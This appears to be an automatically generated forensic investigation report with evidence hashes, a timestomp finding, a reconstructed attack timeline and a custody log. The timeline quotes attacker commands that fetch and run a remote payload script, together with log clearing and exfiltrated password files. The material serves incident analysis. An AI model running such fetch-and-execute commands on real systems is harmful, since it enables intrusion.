# WASP Investigation Report — CASE-2026-LIVE

**Lead Examiner:** Alex Mercer (Senior Forensics Examiner)  
**Organization:** Cyber Incident Response Unit  
**Authorization Reference:** WARRANT-2026-0881  
**Schema Version:** 2.0.0 | **Tool Version:** 1.4.0  

---

## 1. Executive Summary & PS Objectives Matrix

| # | Objective | Status | Findings |
|---|---|---|---|
| 1 | **File metadata extraction** | COMPLETED | Extracted filesystem stats, OOXML properties, PDF metadata, ZIP entries. |
| 2 | **System artefact extraction** | COMPLETED | Extracted MFT, registry hives, EVTX event logs, Prefetch, LNK shortcuts, browser history. |
| 3 | **Timestamp extraction** | COMPLETED | Decoded multi-epoch timestamps normalized to UTC with explainable confidence. |
| 4 | **Chronological timeline reconstruction** | COMPLETED | Generated single normalized super-timeline with 28 records. |
| 5 | **SHA-256 evidence integrity** | VERIFIED | Mandatory SHA-256 computed; custody ledger replayed; Merkle root: `1c73170a7c9f65f5f96cf394ce625e7a5ae869079c95f30736c6de3ab77d52ff`. |
| 6 | **Structured investigation reports** | COMPLETED | Compiled multi-format reports with provenance, integrity block, and privacy redaction. |

---

## 2. Digital Evidence Inventory (SHA-256 Hashes)

| Evidence ID | Path | Container | Size (Bytes) | SHA-256 Hash | Status |
|---|---|---|---|---|---|

| `EV-AUTH.L` | `evidence/auth.log` | raw | 283 | `b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4` | MATCH |

| `EV-BASH_H` | `evidence/bash_history` | raw | 112 | `a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554` | MATCH |

| `EV-EXFILT` | `evidence/exfiltrated_files.zip` | raw | 317 | `80de3b672cc53b95e70cce5448baea5847bfd0858d064010534073169d296803` | MATCH |

| `EV-HISTOR` | `evidence/History` | raw | 8192 | `ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95` | MATCH |

| `EV-INVEST` | `evidence/investigation_memo.docx` | raw | 813 | `c280f521b6b2e7422ee9ae0f44938c2f63fa24d5b244c76206206008429876ba` | MATCH |

| `EV-SECURI` | `evidence/Security_Events.jsonl` | raw | 503 | `15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0` | MATCH |


---




## 4. Cross-Source Corroboration & Anti-Forensics Analysis

- **Corroborated Activity Clusters:** 0
- **Corroborated Events Count:** 0
- **Anti-Forensics / Conflicts Detected:** 1


### Anti-Forensic Anomalies & Timestomp Conflicts
| Severity | Entity | Anomaly Type | Description |
|---|---|---|---|

| **MEDIUM** | `investigation_memo.docx` | `MODIFIED_PRE_CREATION` | Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:27:15.114128+00:00 |





---


## 5. Reconstructed Chronological Activity Timeline (Excerpt)

| UTC Timestamp | Action | User | Object / Target | Source Artefact | Corroborated By | Conf. | Rationale |
|---|---|---|---|---|---|---|---|

| `2024-03-10T14:30:00+00:00` | `FILE_CREATE` | [USER_001] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:created metadata |

| `2024-03-10T20:50:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://github.com/malicious/repo` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-10T21:00:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://pastebin.com/raw/d849fa` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-11T01:50:00+00:00` | `FILE_WRITE` | [USER_002] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:modified metadata (⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:27:15.114128+00:00) |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4624 |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:15:00+00:00` | `PROCESS_START` | UNKNOWN | `wget http://[IP_004]/payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:15:30+00:00` | `FILE_ACCESS` | UNKNOWN | `sudo` | Linux:sudo:evidence/auth.log | `-` | 0.85 | Syslog entry for sudo (assumed year 2024) |

| `2024-03-11T02:16:00+00:00` | `PROCESS_START` | UNKNOWN | `chmod +x payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:16:15+00:00` | `PROCESS_START` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4688 |

| `2024-03-11T02:17:00+00:00` | `PROCESS_START` | UNKNOWN | `./payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:17:30+00:00` | `SERVICE_INSTALL` | UNKNOWN | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 7045 |

| `2024-03-11T02:18:45+00:00` | `FILE_ACCESS` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:20:00+00:00` | `LOG_CLEARED` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 1102 |

| `2026-10-05T19:27:10.760665+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:27:10.767165+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:27:10.772172+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:27:10.807667+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:27:10.825670+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:27:10.837677+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T19:27:10.957324+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:27:12.049167+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:27:13.197821+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:27:14.169180+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:27:15.114128+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T19:27:16.059479+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-06T00:57:10+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::financial_report.pdf` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |

| `2026-10-06T00:57:10+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::passwords.txt` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |


*(Total reconstructed timeline events: 28)*

---

## 6. Cryptographic Integrity & Attestation

- **Overall Integrity Check:** `PASS`
- **Custody Ledger Replay:** `PASS` (12 entries verified)
- **Derived Files Status:** `PASS`
- **Merkle Root Digest:** `1c73170a7c9f65f5f96cf394ce625e7a5ae869079c95f30736c6de3ab77d52ff`

---

## 7. Chain of Custody Audit Log

| Seq | Timestamp (UTC) | Actor | Event Type | Prev Hash | Entry Hash |
|---|---|---|---|---|---|

| 1 | `2026-10-05T19:27:10.848713+00:00` | Alex Mercer (Senior Forensics Examiner) | `case_created` | `000000000000...` | `e9da1e58d301...` |

| 2 | `2026-10-05T19:27:12.037723+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `e9da1e58d301...` | `6b06238de2c1...` |

| 3 | `2026-10-05T19:27:13.178911+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `6b06238de2c1...` | `6d6b94acfd7f...` |

| 4 | `2026-10-05T19:27:14.150276+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `6d6b94acfd7f...` | `15db05f378f2...` |

| 5 | `2026-10-05T19:27:15.094802+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `15db05f378f2...` | `5551e82c4178...` |

| 6 | `2026-10-05T19:27:16.040217+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `5551e82c4178...` | `d7912ddbd923...` |

| 7 | `2026-10-05T19:27:16.952933+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `d7912ddbd923...` | `7201f494b9aa...` |

| 8 | `2026-10-05T19:27:17.093957+00:00` | Alex Mercer (Senior Forensics Examiner) | `artefacts_extracted` | `7201f494b9aa...` | `d664784a31ce...` |

| 9 | `2026-10-05T19:27:17.310043+00:00` | Alex Mercer (Senior Forensics Examiner) | `cross_source_corroborated` | `d664784a31ce...` | `5b52bd73d614...` |

| 10 | `2026-10-05T19:27:17.338006+00:00` | Alex Mercer (Senior Forensics Examiner) | `threat_rules_scanned` | `5b52bd73d614...` | `a79a964ada0b...` |

| 11 | `2026-10-05T19:27:17.982856+00:00` | Alex Mercer (Senior Forensics Examiner) | `timeline_built` | `a79a964ada0b...` | `1033948aa216...` |

| 12 | `2026-10-05T19:27:18.114371+00:00` | Alex Mercer (Senior Forensics Examiner) | `integrity_verified` | `1033948aa216...` | `5a3603fbadb8...` |


---
*Generated automatically by WASP v1.4.0.*
